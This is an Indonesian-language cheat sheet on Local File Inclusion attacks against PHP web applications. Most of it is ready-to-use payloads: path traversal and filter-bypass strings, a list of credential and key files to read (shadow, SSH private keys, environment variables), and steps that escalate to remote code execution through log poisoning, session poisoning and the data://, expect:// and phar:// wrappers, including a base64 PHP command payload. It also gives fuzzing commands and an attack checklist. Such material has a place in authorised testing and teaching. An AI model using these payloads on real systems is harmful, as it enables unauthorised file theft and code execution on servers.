# 📂 LFI (Local File Inclusion) — Membaca File Sensitif di Server

> **Tujuan:** Mengeksploitasi kerentanan *Local File Inclusion* untuk membaca file konfigurasi, kredensial, dan kode sumber aplikasi.

---

## 📌 Penjelasan Singkat

LFI terjadi ketika aplikasi web **memasukkan path file dari input user** (parameter URL) tanpa validasi, sehingga attacker bisa membaca file apa pun di server yang boleh diakses oleh web server.

---

## 🔍 Ciri-Ciri Aplikasi Rentan

- Parameter URL berisi path file: `?page=index.php`, `?lang=en`, `?template=home`.
- Path file **ditampilkan kembali** dalam response.
- Path traversal `../` tidak difilter.
- Error message menampilkan path file asli.

---

## ⚙️ Payload Dasar (Path Traversal)

### Baca `/etc/passwd`

```text
?page=../../../../etc/passwd
?page=....//....//....//....//etc/passwd
?page=/etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
```

> **Penjelasan:** Naik direktori (`../`) sampai ke root filesystem, lalu akses file target. Bypass double-dot filter dengan `....//`.

---

## 🪜 Cheat Sheet Path Traversal

```text
Linux:
../      => 1 level up
../../   => 2 level up
../../../etc/passwd

Windows:
..\      => 1 level up
..\..\..\..\windows\win.ini
```

---

## 🔓 Teknik Bypass Filter

### 1. Double Dot Slash Bypass

```text
?page=....//....//....//etc/passwd
```

> Server filter menghapus `../`, menyisakan `../` yang fungsional.

### 2. URL Encoding

```text
?page=..%2F..%2F..%2Fetc%2Fpasswd
```

> `%2F` = `/`

### 3. Double URL Encoding

```text
?page=..%252F..%252F..%252Fetc%252Fpasswd
```

> `%252F` = `%2F` (server decode dua kali).

### 4. Null Byte (PHP < 5.3.4)

```text
?page=../../../etc/passwd%00
```

> `%00` memotong string setelahnya (null byte injection).

### 5. Absolute Path

```text
?page=/etc/passwd
```

> Langsung tulis full path.

---

## 📂 Target File Penting

### Linux

```text
/etc/passwd                      # Daftar user
/etc/shadow                      # Password hash (butuh root)
/etc/hosts                       # Host mapping
/etc/issue                       # Versi OS
/proc/self/environ               # Environment variables (sering ada credential)
/proc/self/cmdline               # Command yang sedang berjalan
/var/log/apache2/access.log      # Web access log
/var/log/auth.log                # SSH login log
/root/.ssh/id_rsa                # SSH private key root
/home/<user>/.bash_history      # History command user
```

### Windows

```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Users\<user>\Desktop\flag.txt
```

---

## 🎯 LFI ke RCE (Remote Code Execution)

### 1. PHP Filter — Source Code Disclosure

```text
?page=php://filter/convert.base64-encode/resource=index.php
```

Decode base64 → lihat source code → cari **credential DB / token JWT / path admin**.

### 2. Log Poisoning (Apache/Nginx)

**Step 1:** Inject code ke User-Agent via curl:

```bash
curl -A "[MALICIOUS_UA_WITH_CODE]" http://<TARGET>/
```

**Step 2:** Include access.log via LFI:

```text
?page=/var/log/apache2/access.log&cmd=id
```

**Cara kerja:**

```text
1. Attacker request dengan User-Agent berisi script code
2. Code ditulis ke access.log
3. LFI mengeksekusi access.log sebagai PHP
4. Parameter cmd=id dijalankan oleh web server
```

### 3. PHP Session Poisoning

**Step 1:** Login dengan username yang berisi script code.

**Step 2:** Include session file:

```text
?page=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

### 4. PHP Wrapper `data://`

```text
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

> Base64 decode dari string PHP yang mengeksekusi command `id`.

### 5. PHP Wrapper `expect://`

```text
?page=expect://id
```

> Eksekusi command langsung (jarang enabled di production).

### 6. PHP Wrapper `phar://`

```text
?page=phar://./uploads/shell.jpg/shell.php
```

> Eksekusi script dari file non-PHP yang sudah di-upload.

---

## 🔎 Discovery LFI (Cara Menemukan)

### 1. Cek Parameter Berisiko

```text
page=, file=, include=, path=, template=, view=, content=, doc=, lang=, dir=
```

### 2. Fuzzing Parameter

```bash
ffuf -u "http://<TARGET>/index.php?FUZZ=test" -w /usr/share/wordlists/dirb/common.txt -mc 200 -fs 0
```

### 3. Nikto

```bash
nikto -h http://<TARGET>
```

---

## 📋 Tabel Ringkasan LFI

| Teknik | Tujuan |
|--------|--------|
| `?page=../../../etc/passwd` | Path traversal dasar |
| `?page=....//....//etc/passwd` | Bypass filter `../` |
| `?page=..%2F..%2Fetc%2Fpasswd` | URL encoding |
| `?page=php://filter/...` | Source code disclosure |
| `?page=/var/log/apache2/access.log&cmd=id` | Log poisoning RCE |
| `?page=data://text/plain;base64,...` | PHP wrapper RCE |
| `?page=phar://./uploads/...` | Phar wrapper RCE |

---

## ⚠️ Catatan Penting

- **Cek permission**: User web server (`www-data`) hanya bisa baca file yang readable.
- **Shadow file butuh root**: `/etc/shadow` biasanya 640, gagal dengan www-data.
- **Log poisoning**: Inject User-Agent hanya berfungsi jika log bisa ditulis oleh proses web.
- **Session poisoning**: User harus login agar session dibuat di server.
- **Null byte sudah jarang**: Hanya bekerja di PHP < 5.3.4.

---

## ✅ Checklist LFI

- [ ] Identifikasi parameter berisiko (`?page=`, `?file=`, `?lang=`).
- [ ] Test path traversal (`../../../etc/passwd`).
- [ ] Test bypass filter (`....//`, URL encoding).
- [ ] Baca file sensitif (`/etc/passwd`, `/proc/self/environ`).
- [ ] Coba PHP filter untuk source code disclosure.
- [ ] Escalate ke RCE (log poisoning, session poisoning, php://).
- [ ] Cari credential di source code atau lateral movement.

---

## 📚 Referensi

- [OWASP – Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings – LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PHP Wrappers Cheat Sheet](https://www.php.net/manual/en/wrappers.php)